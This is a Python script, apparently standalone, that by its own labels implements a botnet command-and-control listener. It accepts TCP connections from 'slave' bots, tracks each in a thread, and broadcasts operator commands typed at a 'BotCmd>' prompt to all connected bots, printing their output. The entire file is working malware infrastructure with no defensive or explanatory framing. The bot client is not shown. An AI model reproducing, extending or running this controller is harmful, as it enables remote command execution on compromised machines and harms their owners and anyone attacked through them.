#!/usr/bin/python3

import socket
import sys
import os
import threading
import queue
import time

q = queue.Queue()
Socketthread = []
ClientList = {}

#-------------------------------------------------------------------------------------------

class BotHandler(threading.Thread):
    def __init__(self, client, client_address, qv):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.q = qv

    def run(self):
        BotName = threading.current_thread().getName()
        print("[*] Slave " + self.ip + ":" + str(self.port) + " connected with Thread-ID: ", BotName)
        ClientList[BotName] = self.client_address
        while True:
            RecvBotCmd = self.q.get()
            # print("\nReceived Command: " + RecvBotCmd + " for " + BotName)
            try:
#                RecvBotCmd += "\n"
                self.client.send(RecvBotCmd.encode('utf-8'))
                recvVal = (self.client.recv(1024)).decode('utf-8')
                print(recvVal)
            except Exception as ex:
                # for t in Socketthread:
                #     if t.is_alive() == False:
                #         print("\n[!] Died Thread: " + str(t))
                #         t.join()
                print(ex)
                break

#-------------------------------------------------------------------------------------------

class BotCmd(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)
        self.q = qv2

    def run(self):
        while True:
            SendCmd = str(input("BotCmd> "))
            if (SendCmd == ""):
                pass
            elif (SendCmd == "exit"):
                for i in range(len(Socketthread)):
                    time.sleep(0.1)
                    self.q.put(SendCmd)
                time.sleep(5)
                os._exit(0)
            else:
                print("[+] Sending Command: " + SendCmd + " to " + str(len(Socketthread)) + " bots")
                for i in range(len(Socketthread)):
                    time.sleep(0.1)
                    self.q.put(SendCmd)

#-------------------------------------------------------------------------------------------

def listener(lhost, lport, q):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(10)

    print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
    BotCmdThread = BotCmd(q)
    BotCmdThread.start()
    while True:
        (client, client_address) = server.accept()    #start listening
        newthread = BotHandler(client, client_address, q) #BotHandler = Multiconn
        Socketthread.append(newthread)
        newthread.start()

#-------------------------------------------------------------------------------------------
#import
def main():
    if (len(sys.argv) < 3):
        print ("[!] Usage:\n  [+] python3 " + sys.argv[0] + " <LHOST> <LPORT>\n  [+] Eg.: python3 " + sys.argv[0] + " 0.0.0.0 8080\n")
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost, lport, q)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")

if __name__ == '__main__':
    main()